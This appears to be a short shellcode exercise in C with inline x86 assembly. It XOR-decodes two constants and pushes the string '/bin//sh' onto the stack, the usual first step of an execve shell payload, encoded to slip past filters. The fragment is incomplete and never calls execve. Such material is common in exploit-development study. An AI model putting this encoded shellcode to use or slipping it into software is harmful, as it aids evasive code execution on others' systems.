void main() {
	__asm__("movl $0xd6cd9191, %edx");
	__asm__("xorl $0xbebebebe, %edx");
	__asm__("pushl %edx"); 
	__asm__("movl $0xd0d7dc91, %edx");
	__asm__("xorl $0xbebebebe, %edx");
	__asm__("pushl %edx"); 
}
